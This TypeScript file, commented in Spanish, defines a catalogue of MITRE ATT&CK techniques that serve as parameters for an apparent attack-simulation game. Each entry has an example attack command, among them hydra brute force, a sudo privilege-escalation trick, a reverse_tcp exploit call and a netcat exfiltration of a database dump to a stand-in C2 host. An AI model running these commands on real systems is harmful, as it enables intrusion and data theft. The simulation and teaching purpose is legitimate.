import type { TechniqueMeta, Phase } from '../../shared/protocol';

// Catálogo abstraído de MITRE ATT&CK. Son PARÁMETROS de simulación, no comandos.
// faseRequiere: fase previa que el nodo debe tener; faseProduce: a qué fase avanza si éxito.
export const TECNICAS: TechniqueMeta[] = [
  { id: 'portscan', nombre: 'Barrido de puertos', tacticaMitre: 'TA0007 Discovery',
    faseRequiere: null, faseProduce: 'recon', ruido: 'alto', facilidadBase: 0.9,
    descripcion: 'Descubre puertos y servicios abiertos. Muy ruidoso, fácil de detectar.',
    comandoEjemplo: 'nmap -sS -T4 -p- {target}' },
  { id: 'enum', nombre: 'Enumeración de servicios', tacticaMitre: 'TA0007 Discovery',
    faseRequiere: null, faseProduce: 'recon', ruido: 'medio', facilidadBase: 0.8,
    descripcion: 'Identifica versiones, banners y configuraciones vulnerables.',
    comandoEjemplo: 'nmap -sV -sC --version-all {target}' },
  { id: 'scan_docs', nombre: 'Búsqueda de .env y documentos', tacticaMitre: 'TA0009 Collection',
    faseRequiere: null, faseProduce: 'recon', ruido: 'bajo', facilidadBase: 0.85,
    descripcion: 'Filtra y extrae variables .env, tokens de API, copias de seguridad y documentos confidenciales.',
    comandoEjemplo: 'gobuster dir -u http://{target} -w sec_files.txt -x env,bak,docx,pdf,sql' },
  { id: 'bruteforce', nombre: 'Fuerza de credenciales', tacticaMitre: 'TA0006 Credential Access',
    faseRequiere: 'recon', faseProduce: 'acceso_inicial', ruido: 'medio', facilidadBase: 0.55,
    descripcion: 'Ataque de diccionario y credenciales débiles sobre servicios expuestos.',
    comandoEjemplo: 'hydra -L users.txt -P rockyou.txt {target} ssh' },
  { id: 'exploit', nombre: 'Explotación de servicio (RCE)', tacticaMitre: 'TA0001 Initial Access',
    faseRequiere: 'recon', faseProduce: 'acceso_inicial', ruido: 'bajo', facilidadBase: 0.45,
    descripcion: 'Abusa vulnerabilidades críticas (CVE / RCE / Injection). Sigiloso pero requiere precisión.',
    comandoEjemplo: 'python3 exploit_cve.py --rhost {target} --payload reverse_tcp' },
  { id: 'privesc', nombre: 'Escalada de privilegios', tacticaMitre: 'TA0004 Privilege Escalation',
    faseRequiere: 'acceso_inicial', faseProduce: 'escalada', ruido: 'bajo', facilidadBase: 0.5,
    descripcion: 'Explota debilidades locales de kernel o tokens para obtener permisos ROOT / SYSTEM.',
    comandoEjemplo: 'sudo -u#-1 /bin/bash # or winpeas.exe / privilege-token' },
  { id: 'pivot', nombre: 'Pivote lateral', tacticaMitre: 'TA0008 Lateral Movement',
    faseRequiere: 'escalada', faseProduce: 'acceso_inicial', ruido: 'medio', facilidadBase: 0.55,
    descripcion: 'Salta desde un nodo con privilegios a un vecino interno comprometiéndolo directamente.',
    comandoEjemplo: 'chisel client {target}:8000 R:socks && proxychains psexec' },
  { id: 'exfil', nombre: 'Robo y exfiltración de datos', tacticaMitre: 'TA0010 Exfiltration',
    faseRequiere: 'acceso_inicial', faseProduce: 'exfiltracion', ruido: 'alto', facilidadBase: 0.65,
    descripcion: 'Empaqueta, cifra y extrae la base de datos o documentos sensibles hacia el servidor C2.',
    comandoEjemplo: 'pg_dump {target} | gpg -c | nc -w 3 c2.darknet 4444' },
];

export const TECNICA_POR_ID = new Map(TECNICAS.map(t => [t.id, t]));

export const RUIDO_VAL: Record<TechniqueMeta['ruido'], number> = { bajo: 0.25, medio: 0.55, alto: 0.9 };

// Orden de fases para validar la kill chain.
export const ORDEN_FASE: Phase[] = ['recon', 'acceso_inicial', 'escalada', 'movimiento_lateral', 'exfiltracion'];
export function faseIndex(f: Phase | null): number { return f === null ? -1 : ORDEN_FASE.indexOf(f); }
